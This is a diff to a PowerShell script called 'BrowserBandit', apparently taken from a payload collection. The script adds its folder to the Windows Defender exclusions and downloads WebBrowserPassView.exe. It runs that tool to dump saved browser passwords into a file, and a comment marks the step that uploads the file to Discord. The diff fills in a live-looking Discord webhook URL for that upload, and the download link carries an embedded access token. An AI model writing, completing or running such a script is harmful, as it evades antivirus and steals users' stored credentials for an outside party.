@@ -3,7 +3,7 @@ $dir = "C:/BrowserBandit"
 $exePath = "$dir/WebBrowserPassView.exe"
 $outputFile = "$env:UserName-passwords.txt"
 $srcUrl = "https://raw.githubusercontent.com/Code-382/Payload-Depot/main/SignalStrike/Browser%20Bandit/WebBrowserPassView.exe?token=GHSAT0AAAAAACXIFIYHTBAFBUCCSI52SSN6ZXBQYFA"
-$discordWebhook = "<DISCORDWEBHOOK HERE>"
+$discordWebhook = "https://discord.com/api/webhooks/1283400106883682395/cgFwGhEzq25rzrmt3MzLAjqJEFSJfppbtljDtFojQZufi8ajRu6OfQLvv9l8rXbnUNDh"
 
 # Create directory and disable real-time monitoring
 mkdir $dir
@@ -14,7 +14,7 @@ Set-MpPreference -ExclusionPath $dir
 Invoke-WebRequest $srcUrl -OutFile $exePath
 
 # Run the executable and save the output to a text file
-Set-Location "C:/fileUp"
+Set-Location "C:/BrowserBandit"
 & $exePath /stext $outputFile
 
 # Upload the file to Discord
